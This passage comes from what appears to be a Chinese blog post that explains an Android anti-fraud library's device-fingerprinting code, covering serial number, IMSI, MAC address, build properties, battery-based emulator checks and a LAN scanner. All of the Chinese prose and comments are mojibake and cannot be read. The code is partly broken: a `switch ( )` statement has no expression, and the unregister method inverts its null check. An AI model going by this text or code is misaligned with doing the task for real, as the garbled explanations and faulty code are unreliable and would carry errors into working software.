class="keyword">import</span> com.snail.antifake.deviceid.emulator.EmuCheckUtil;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.macaddress.MacAddressUtils;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.jni.PropertiesGet;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: hzlishang</span></span><br><span class="line"><span class="comment"> * Data: 17-7-26 ä¸Šåˆ11:02</span></span><br><span class="line"><span class="comment"> * Des: javaä¸C ï¼Œä»£ç†ä¸æœåŠ¡éƒ½èƒ½è¢«hookï¼Œç›®å‰è¿˜æ²¡æ‰¾ä¸èƒ½è¢«ç¯¡æ”¹çš„æ–¹æ³•ï¼Œåªèƒ½å°†ç¯¡æ”¹çš„æˆæœ¬æé«˜</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidDeviceIMEIUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isRunOnEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> EmuCheckUtil.mayOnEmulator(context);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> DeviceIdUtil.getDeviceId(context);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getAndroidId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> IAndroidIdUtil.getAndroidId(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getMacAddress</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> MacAddressUtils.getMacAddress(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//@Deprecated</span></span><br><span class="line">    <span class="comment">// IMPORTANT: This field should be initialized via a function call to</span></span><br><span class="line">    <span class="comment">// prevent its value being inlined in the app during compilation because</span></span><br><span class="line">    <span class="comment">// we will later set it to the value based on the app&#x27;s target SDK.</span></span><br><span class="line">    <span class="comment">//  public static final String SERIAL = getString(&quot;no.such.thing&quot;);</span></span><br><span class="line">    <span class="comment">//    åºåˆ—å· é‡æ–°çƒ§å½•flash</span></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerialno</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialno</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">                serialno = Build.getSerial();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                serialno = PropertiesGet.getString(<span class="string">&quot;ro.serialno&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.isEmpty(serialno)) &#123;</span><br><span class="line">                    serialno = Build.SERIAL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serialno;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getManufacturer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBrand</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.brand&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getModel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCpuAbi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name of the underlying board, like &quot;goldfish&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBoard</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.board&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name of the hardware (from the kernel command line or /proc).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHardware</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.hardware&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBootloader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.bootloader&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    //TODO 17-7-31 by lishang : æš‚æ—¶è¿™ä¹ˆè·å–ï¼Œä¸å¤ªé‡è¦</span></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIMSI</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">        <span class="keyword">return</span> telephonyManager.getSubscriberId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BatteryChangeReceiver sBatteryChangeReceiver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">            sBatteryChangeReceiver = <span class="keyword">new</span> <span class="title class_">BatteryChangeReceiver</span>();</span><br><span class="line">            <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">            filter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">            context.registerReceiver(sBatteryChangeReceiver, filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unRegisterBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">            context.unregisterReceiver(sBatteryChangeReceiver);</span><br><span class="line">            sBatteryChangeReceiver = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !(sBatteryChangeReceiver == <span class="literal">null</span> || sBatteryChangeReceiver.isCharging());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getCurrentBatteryLevel</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sBatteryChangeReceiver != <span class="literal">null</span> ? sBatteryChangeReceiver.getCurrentLevel() : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMac</span><span class="params">(IpScanner.OnScanListener listener)</span> &#123;</span><br><span class="line">        <span class="type">IpScanner</span> <span class="variable">ipScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IpScanner</span>();</span><br><span class="line">        ipScanner.startScan(listener);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªçœ‹å®ç°çš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerialno</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">serialno</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">            serialno = Build.getSerial();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            serialno = PropertiesGet.getString(<span class="string">&quot;ro.serialno&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.isEmpty(serialno)) &#123;</span><br><span class="line">                serialno = Build.SERIAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Android 8.0 (API 26) åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œä½¿ç”¨<code>Build.getSerial()</code>ï¼ˆ<code>import android.os.Build;</code>ï¼‰è·å–è®¾å¤‡çš„ç¡¬ä»¶åºåˆ—å·</p><p>åœ¨æ—§ç‰ˆæœ¬ä¸­ï¼Œé€šè¿‡<code>PropertiesGet.getString(&quot;ro.serialno&quot;)</code>çš„JNIæ¥è¯»å–ç³»ç»Ÿå±æ€§ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™å›é€€åˆ°ä½¿ç”¨ <code>Build.SERIAL</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getManufacturer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBrand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.brand&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getModel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCpuAbi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of the underlying board, like &quot;goldfish&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBoard</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.board&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of the hardware (from the kernel command line or /proc).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHardware</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.hardware&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBootloader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.bootloader&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>getManufacturer()</code>: è·å–è®¾å¤‡åˆ¶é€ å•†ï¼Œå¦‚ â€œHUAWEIâ€, â€œXiaomiâ€ã€‚</li><li><code>getBrand()</code>: è·å–è®¾å¤‡å“ç‰Œï¼Œå¦‚ â€œhonorâ€, â€œRedmiâ€ã€‚</li><li><code>getModel()</code>: è·å–è®¾å¤‡å‹å·ï¼Œå¦‚ â€œVOG-AL00â€, â€œK30S Ultraâ€ã€‚</li><li><code>getCpuAbi()</code>: è·å– CPU çš„ ABIï¼ˆåº”ç”¨äºŒè¿›åˆ¶æ¥å£ï¼‰ï¼Œå¦‚ â€œarm64-v8aâ€ã€‚è¿™è¡¨æ˜äº† CPU çš„æ¶æ„ã€‚</li><li><code>getDevice()</code>: è·å–è®¾å¤‡ä»£å·ï¼Œå¦‚ â€œHWVOGâ€ã€‚</li><li><code>getBoard()</code>: è·å–ä¸»æ¿åç§°ï¼Œå¦‚ â€œgoldfishâ€ï¼ˆå¸¸è§äºæ¨¡æ‹Ÿå™¨ï¼‰ã€‚</li><li><code>getHardware()</code>: è·å–ç¡¬ä»¶åç§°ï¼Œå¦‚ â€œkirin980â€ã€‚</li><li><code>getBootloader()</code>: è·å–å¼•å¯¼åŠ è½½ç¨‹åºï¼ˆBootloaderï¼‰çš„ç‰ˆæœ¬å·ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TODO 17-7-31 by lishang : æš‚æ—¶è¿™ä¹ˆè·å–ï¼Œä¸å¤ªé‡è¦</span></span><br><span class="line"><span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIMSI</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">    <span class="keyword">return</span> telephonyManager.getSubscriberId();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–è®¾å¤‡çš„ <strong>IMSI</strong>ï¼ŒIMSI æ˜¯ç”¨äºå”¯ä¸€è¯†åˆ«ç§»åŠ¨ç½‘ç»œä¸­ç”¨æˆ·çš„ç¼–å·ï¼Œå®ƒå­˜å‚¨åœ¨ SIM å¡ä¸­</p><blockquote><p>ä½†æ˜¯<strong>ä» Android 10 (API 29) å¼€å§‹</strong>ï¼Œæ™®é€šåº”ç”¨è°ƒç”¨ <code>getSubscriberId()</code> å°†ä¸å†è¿”å›æœ‰æ•ˆçš„ IMSIã€‚å¦‚æœåº”ç”¨ä¸å…·å¤‡ç‰¹æ®Šçš„è¿è¥å•†æƒé™ï¼Œè°ƒç”¨æ­¤æ–¹æ³•ä¼šæŠ›å‡º <code>SecurityException</code>ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> BatteryChangeReceiver sBatteryChangeReceiver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">        sBatteryChangeReceiver = <span class="keyword">new</span> <span class="title class_">BatteryChangeReceiver</span>();</span><br><span class="line">        <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        filter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">        context.registerReceiver(sBatteryChangeReceiver, filter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unRegisterBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">        context.unregisterReceiver(sBatteryChangeReceiver);</span><br><span class="line">        sBatteryChangeReceiver = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !(sBatteryChangeReceiver == <span class="literal">null</span> || sBatteryChangeReceiver.isCharging());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getCurrentBatteryLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> sBatteryChangeReceiver != <span class="literal">null</span> ? sBatteryChangeReceiver.getCurrentLevel() : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>registerBatteryChangeListener</code>æ³¨å†Œä¸€ä¸ª<code>BatteryChangeReceiver</code>æ¥ç›‘å¬ç³»ç»Ÿçš„ç”µæ± çŠ¶æ€å˜åŒ–</p><blockquote><p>æ‰€æœ‰æ–¹æ³•ä½äº<code>BatteryChangeReceiver.java</code>å®ç°</p></blockquote><p><code>unRegisterBatteryChangeListener</code>æ³¨é”€ä¹‹å‰æ³¨å†Œçš„å¹¿æ’­æ¥æ”¶å™¨</p><p><code>isCharging()</code>è·å–å½“å‰æ˜¯å¦åœ¨å……ç”µï¼Œé€šè¿‡<code>sBatteryChangeReceiver.isCharging()</code></p><p><code>getCurrentBatteryLevel</code>è·å–å½“å‰çš„ç”µé‡ï¼Œé€šè¿‡<code>sBatteryChangeReceiver.getCurrentLevel()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMac</span><span class="params">(IpScanner.OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="type">IpScanner</span> <span class="variable">ipScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IpScanner</span>();</span><br><span class="line">    ipScanner.startScan(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>IpScanner.java</code>ä¸­å®ç°ï¼Œå…¶ä¸­<code>ipScanner.startScan(listener);</code>ä¼šæ‰«æå±€åŸŸç½‘å†…çš„å…¶ä»–è®¾å¤‡</p><h3 id="BatteryChangeReceiver-java"><a href="#BatteryChangeReceiver-java" class="headerlink" title="BatteryChangeReceiver.java"></a>BatteryChangeReceiver.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.BatteryManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: hzlishang</span></span><br><span class="line"><span class="comment"> * Data: 17-8-18 ä¸‹åˆ1:54</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BatteryChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> mIsCharging;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> mCurrentLevel;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åªæœ‰æœªå……ç”µï¼Œå¹¶ä¸”ç”µé‡ç»å¸¸ä¸å˜æ‰çœ‹æˆæ¨¡æ‹Ÿå™¨ï¼Œè¿™ä¸ªæ–¹æ³•å¾ˆå®¹æ˜“é€ å‡ï¼Œå‚è€ƒæ„ä¹‰ä¸å¤§</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> intent.getIntExtra(BatteryManager.EXTRA_STATUS, <span class="number">0</span>);</span><br><span class="line">        mCurrentLevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> ( ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_CHARGING:</span><br><span class="line">                <span class="comment">// ç”µæ± æ»¡ä¸ä½œä¸ºå‚è€ƒï¼Œçœ‹åšå……ç”µä¸­</span></span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_FULL:</span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_UNKNOWN:</span><br><span class="line">                mIsCharging = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_NOT_CHARGING:</span><br><span class="line">            <span class="keyword">case</span> BatteryManager.BATTERY_STATUS_DISCHARGING:</span><br><span class="line">                mIsCharging = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Toast.makeText(context, &quot; &quot; + mCurrentLevel + &quot; mIsCharging &quot;+ mIsCharging, Toast.LENGTH_SHORT).show();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mIsCharging;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCurrentLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mCurrentLevel;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>public class BatteryChangeReceiver extends BroadcastReceiver</code>ç»§æ‰¿äº†<code>BroadcastReceiver</code>ç±»ï¼Œè¿™æ„å‘³ç€å®ƒå…·å¤‡äº†å¹¿æ’­æ¥æ”¶å™¨çš„èƒ½åŠ›ã€‚</p><p><code>onReceive</code>æ–¹æ³•çš„è°ƒç”¨æ—¶æœºï¼šè¦è®© <code>onReceive</code> æ–¹æ³•è¢«è°ƒç”¨ï¼Œéœ€è¦ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>åˆ›å»ºå¹¿æ’­æ¥æ”¶å™¨</strong>ï¼šæˆ‘ä»¬å·²ç»æœ‰äº† <code>BatteryChangeReceiver</code> 